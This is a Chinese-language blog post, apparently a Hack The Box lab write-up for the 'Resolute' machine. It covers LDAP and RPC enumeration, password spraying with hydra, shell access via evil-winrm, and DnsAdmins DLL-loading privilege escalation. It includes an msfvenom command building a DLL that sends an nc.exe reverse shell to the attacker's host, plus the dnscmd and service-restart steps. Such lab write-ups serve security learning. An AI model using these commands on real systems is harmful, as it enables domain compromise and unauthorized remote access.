@@ -1,0 +1,1061 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="wD6I1h8lGi">
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.2" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="关于这次选择了难度高一些的靶机做，感觉到了技术实力的不足😭。这是一台Windows系统的服务器，对windows一直不是很了解，仅限于办公和游戏。之前虽说也做过几个windwos的靶机，终究还是难度低，这次学到了不少windows渗透姿势。 信息收集首先打开nmap开始扫端口，靶机IP为10.10.10.169，扫描命令和结果如下 1namp -sS -Pn 10.10.10.169   看到靶">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-the-Box Resolute">
+<meta property="og:url" content="http://ama666.cn/2020/04/02/Hack-the-Box-Resolute/index.html">
+<meta property="og:site_name" content="ama666">
+<meta property="og:description" content="关于这次选择了难度高一些的靶机做，感觉到了技术实力的不足😭。这是一台Windows系统的服务器，对windows一直不是很了解，仅限于办公和游戏。之前虽说也做过几个windwos的靶机，终究还是难度低，这次学到了不少windows渗透姿势。 信息收集首先打开nmap开始扫端口，靶机IP为10.10.10.169，扫描命令和结果如下 1namp -sS -Pn 10.10.10.169   看到靶">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200402194126.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200403004315.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200403024348.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200403025040.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404155336.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404160008.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404160539.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404160837.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404192024.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404192208.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404192640.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404195902.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404202446.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404202534.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404202613.png">
+<meta property="og:updated_time" content="2020-04-05T01:58:22.147Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hack-the-Box Resolute">
+<meta name="twitter:description" content="关于这次选择了难度高一些的靶机做，感觉到了技术实力的不足😭。这是一台Windows系统的服务器，对windows一直不是很了解，仅限于办公和游戏。之前虽说也做过几个windwos的靶机，终究还是难度低，这次学到了不少windows渗透姿势。 信息收集首先打开nmap开始扫端口，靶机IP为10.10.10.169，扫描命令和结果如下 1namp -sS -Pn 10.10.10.169   看到靶">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200402194126.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://ama666.cn/2020/04/02/Hack-the-Box-Resolute/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Hack-the-Box Resolute | ama666</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ama666</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">平时多喝点茶</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://ama666.cn/2020/04/02/Hack-the-Box-Resolute/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="安大侠">
+      <meta itemprop="description" content="每天挣扎的活着">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ama666">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Hack-the-Box Resolute
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-04-02 19:35:47" itemprop="dateCreated datePublished" datetime="2020-04-02T19:35:47+08:00">2020-04-02</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-04-05 09:58:22" itemprop="dateModified" datetime="2020-04-05T09:58:22+08:00">2020-04-05</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h2><p>这次选择了难度高一些的靶机做，感觉到了技术实力的不足😭。这是一台Windows系统的服务器，对windows一直不是很了解，仅限于办公和游戏。之前虽说也做过几个windwos的靶机，终究还是难度低，这次学到了不少windows渗透姿势。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先打开nmap开始扫端口，靶机IP为<code>10.10.10.169</code>，扫描命令和结果如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sS -Pn 10.10.10.169</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200402194126.png" alt></p>
+<p>看到靶机开放了许多端口，并没有熟悉的80端口，也就是无法通过网站中的信息来获取user。那么就逐一看看每个窗口都开放了什么服务。首先是<code>135</code>端口开放了<code>msrpc</code>，RPC(Remote Procedure call)是Windows上的一个协议，可以远程调用远程的进程，使进程之间交流通信，网上一张图片清晰的说明了RPC协议的架构</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200403004315.png" alt></p>
+<p>Stub是存根的意思，Client段存储Server地址消息，将客户端请求参数打包发往Server，Server Stub接收消息并解包，调用本地的方法。</p>
+<p>观察看到了目标靶机开放了<code>139</code>和<code>445</code>两个端口，推测在目标靶机上运行了SMB共享文件和打印的服务。SMB是基于NBT(net bios over tcp/ip)的跨平台共享文件的协议，通常使用137(UDP)、138(UDP)、139(TCP)端口进行通信。除了基于NBT协议，SMB还会通过<code>445</code>端口进行通信，如果445端口无响应，再去联通139端口。</p>
+<p><code>389</code>端口运行ldap服务。LDAP是一种轻量级目录访问协议，可以理解为一种类似于的树状存储信息的数据库。</p>
+<p>上面就是这台靶机在低端口中存在的常见服务，特别注意<code>53</code>和<code>464</code>端口表明这是一台AD。</p>
+<p>更多的关于Windwos端口信息参见<a href="https://support.microsoft.com/zh-cn/help/832017/service-overview-and-network-port-requirements-for-windows" target="_blank" rel="noopener">官方文档</a>。</p>
+<h2 id="获取登陆凭证"><a href="#获取登陆凭证" class="headerlink" title="获取登陆凭证"></a>获取登陆凭证</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>针对现有收集到的信息，首先从SMB服务开始寻找机会。尝试SMB空口令列出共享目录信息，发现时需要密码的，尝试失败。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.10.10.169</span><br></pre></td></tr></table></figure>
+
+<p>看来SMB需要密码才能获取信息，那么突破口就不在这里，将目光锁定在ldap服务上。从nmap扫描中得到的信息来看，这台服务器是运行在megabank.local域下面的，我想查找这个域中还有其他那些用户，使用<code>ldapsearch</code>工具。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -b "dc=megabank, dc=local" -h 10.10.10.169</span><br></pre></td></tr></table></figure>
+
+<p>理解上面这条命令。首先<code>-x</code>参数开启ldap的简单认证(simple authentication)，意思是想服务器发送密码进行登录验证。这种方式使得密码在网络中明文传输不安全故名为简单认证。第二个参数<code>-b</code>表示从<code>searchbase</code>开始查找而不是当下默认位置。关于<code>searchbase</code>的定义我找到如下，大概意思是searchbase定义从ldap树状结构的哪里开始寻找。在本命令中，开始寻找的节点即为<code>megabank.local</code>。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200403024348.png" alt></p>
+<p>上述命令得到了海量搜索结果，因为我们只需要对用户进行搜索，所以可以对命令进行优化，得到了一堆用户名。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -b "cn=Users, dc=megabank, dc=local" -h 10.10.10.169 ｜ grep dn</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200403025040.png" alt></p>
+<p>仅仅有用户名还不够，想要连接一开始的SMB需要找到用户名相对应的密码才行。装过头来仔细缕一缕曾经探查过的服务，发现还有<code>rpc</code>服务没有仔细的探索。当Windwos管理员很懒惰的时候，也许没有关闭RPC的免密码匿名登陆。使用命令成功连接服务器，进入rpcclient命令交互页面。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U "" -N -W=megabank 10.10.10.169</span><br></pre></td></tr></table></figure>
+
+<p>输入help查看有什么可以执行的命令，参考rpcclient<a href="https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html" target="_blank" rel="noopener">官方文档</a>。在这里也可以直接获取域内所有的用户</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enumdomusers</span><br></pre></td></tr></table></figure>
+
+<p>这个命令是SAMR(Security Account Manager Remote Protocol)协议的命令，可以在rpcclient中执行。其中有许多对与渗透测试信息收集很有用处的命令。执行命令查看显示信息，发现了<code>marko</code>账户创建，并将密码设置为<code>Welcome123!</code>。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">querydispinfo</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404155336.png" alt></p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用工具<code>enum4linux</code>，此工具是用来枚举Windows和Samba主机中的信息，包装了<code>smbclient</code>,<code>rpcclient</code>,<code>net</code>和<code>nmblookup</code>工具，主要特性有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RID循环（当Windows 2000上的RestrictAnonymous设置为1时）</span><br><span class="line">用户列表（当Windows 2000上的RestrictAnonymous设置为0时）</span><br><span class="line">组成员信息列表</span><br><span class="line">共享枚举</span><br><span class="line">检测主机是否在工作组或域中</span><br><span class="line">识别远程操作系统</span><br><span class="line">密码策略检索（使用polenum）</span><br></pre></td></tr></table></figure>
+
+<p>用此工具可以直接获得域内所有用户信息和显示信息，一步获得第一个方法中的全部信息，不得不感叹工具真好用。</p>
+<h2 id="获取用户"><a href="#获取用户" class="headerlink" title="获取用户"></a>获取用户</h2><p>尝试使用这一组密码登录<code>smbclient</code>失败，但是由于密码特殊，很像是账户创建之后设置的默认密码。既然之前我们已经得到了域内用户信息，将用户名做成字典爆破一下smb客户端，成功获得一组登陆凭证。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -p Welcome123! 10.10.10.169 smb</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404160008.png" alt></p>
+<p>列出SMB共享目录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.10.10.169 -U melanie%Welcome123!</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404160539.png" alt></p>
+<p>挨个目录看了一下没有什么有用的信息。既然可以进入smb客户端，就可以用<code>evil-winrm</code>拿shell了。使用以下命令成功getshell。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404160837.png" alt></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>进入<code>Users</code>目录，发现除了<code>melanie</code>之外还有管理员<code>Administrator</code>和<code>ryan</code>，当然都没有权限进入他们两个的目录中。查看一下当前用户所拥有的权限和所在用户组，发现几乎没什么权限，所在用户自也很普通。User目录中没什么可以继续收集的信息，返回C盘根目录，发现有一个自己命名的隐藏目录，一路跟进去发现一个叫做<code>PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</code>的文件，名称后面的一串日期惹人注目，根据经验一般这种明明都是日志一类的信息，结合前面的名字莫不是powershell执行命令的记录？之前只知道<code>Transcript</code>是成绩单的意思，上网上查查字典，发现原来transcript还有文件、打印副本的意思。那这应该就是某一天一个用户在powershell中执行命令的副本了？</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404192024.png" alt></p>
+<p>我对这个文件有读的权限，打开看看，在里面发现了看起来像是一组登陆凭证的东西</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404192208.png" alt></p>
+<p>用新得到的这一组用户名密码尝试登录smbclient成功，使用evil-winrm得到此用户的shell。同样扫了一眼用户自己的目录中没有什么有价值的信息。看一眼用户权限以及所有在用户组，同样没什么权限，但与上一个用户不一样的事，这个用户处于<code>MEGABANK/DnsAdmins</code>用户组。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404192640.png" alt></p>
+<p>Google一下关于DnsAdmin的漏洞，发现有此权限的用户可以在DNS服务器上<strong>远程挂载dll</strong>。</p>
+<blockquote>
+<p>利用条件：拥有DnsAdmins用户组的权限 <strong>或</strong> 对DNS服务对象有写权限</p>
+</blockquote>
+<p>此漏洞可以将一个含有反向shell的dll以系统(SYSTEM)权限挂载到DNS服务器(DC)上，更多关于此漏洞的原理和利用方法可以看<a href="https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83" target="_blank" rel="noopener">这篇文章</a>，利用方法简单概括就是在我本地搭建一个可以被目标DC读取文件的Samba服务器，将恶意dll存储在共享目录中，然后登录拥有DNSAdmin权限的用户，执行挂载命令后重启DC，即可反弹shell到本地。 注意微软原话解释说这是一个特性(Feature)，而不是漏洞(Bug)。</p>
+<p>下面就开始利用这个特性来反弹shell。首先我需要在我的Kali上搭建一个SMB服务，索性前人已经栽好了树，使用kali已经安装好的<code>impacket</code>工具可以快速搭建，具体使用方法可以看<a href="https://blog.ropnop.com/transferring-files-from-kali-to-windows/#setting-up-the-server" target="_blank" rel="noopener">这篇文章</a>，文章中还提及了很多从Linux向Windows传输文件的方法，可以作为后渗透手段学习一下。</p>
+<p>首先我们需要制作一个恶意dll文件反弹shell，网上有<a href="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LR2p6cFXrtS2pqrKTsc%2F-LR2pCB0IsoJbKE_SZye%2FScreenshot%20from%202018-11-11%2017-30-47.png?alt=media&token=4f52e671-fe5b-4dad-87b6-438c232188a2" target="_blank" rel="noopener">已经做好的dll</a>可供使用，也可以自己使用msfvenom做一个，网上教程一抓一大把。输入以下命令创建，IP是自己的，端口是用来接收shell的。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec CMD='\\10.10.14.236\smb\nc.exe 10.10.14.236 6666 -e cmd.exe' -f dll &gt; reverse.dll</span><br></pre></td></tr></table></figure>
+
+<p>新建一个目录作为共享目录，进入目录后执行如下命令开始共享，<code>pwd</code>的意思是共享当前所在目录。同时也用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver share `pwd`</span><br></pre></td></tr></table></figure>
+
+<p>然后在DC上执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscmd.exe /config /serverlevelplugindll \\10.10.14.236\smb\reverse.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404195902.png" alt></p>
+<p>重启dns服务器，使用如下命令。要填写DC的SeverName，可以使用<code>ipconfig /all</code>查看，针对本靶机可以填<code>\\Resolute</code>，也可以不填，默认对本机操作。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe \\resolute stop dns</span><br><span class="line">sc.exe \\resolute start dns</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404202446.png" alt></p>
+<p>看到共享目录日志已经连接到目标DC</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404202534.png" alt></p>
+<p>同时监听端口也获得了反弹shell，在桌面找到了root.txt。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200404202613.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e1d94876a506850d0c20edb5405e619c</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>安大侠</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="http://ama666.cn/2020/04/02/Hack-the-Box-Resolute/" title="Hack-the-Box Resolute">http://ama666.cn/2020/04/02/Hack-the-Box-Resolute/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/28/Hack-the-Box-OpenAdmin/" rel="next" title="Hack the Box-OpenAdmin">
+                <i class="fa fa-chevron-left"></i> Hack the Box-OpenAdmin
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/05/25/Redis主从漏洞复现/" rel="prev" title="Redis主从漏洞复现">
+                Redis主从漏洞复现 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png" alt="安大侠">
+            
+              <p class="site-author-name" itemprop="name">安大侠</p>
+              <div class="site-description motion-element" itemprop="description">每天挣扎的活着</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">63</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">标签</span>
+                  
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+             <div class="cc-license motion-element" itemprop="license">
+              
+              
+                
+              
+              
+              
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+             </div>
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hengyud.cn" title="https://hengyud.cn" rel="noopener" target="_blank">小P</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.lookupes.cn" title="http://blog.lookupes.cn" rel="noopener" target="_blank">孙哥</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://timeshu.github.io" title="https://timeshu.github.io" rel="noopener" target="_blank">Time</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://zo1ro.github.io" title="http://zo1ro.github.io" rel="noopener" target="_blank">imy0r1in</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://jgeek.cn/" title="https://jgeek.cn/" rel="noopener" target="_blank">\0x584A</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
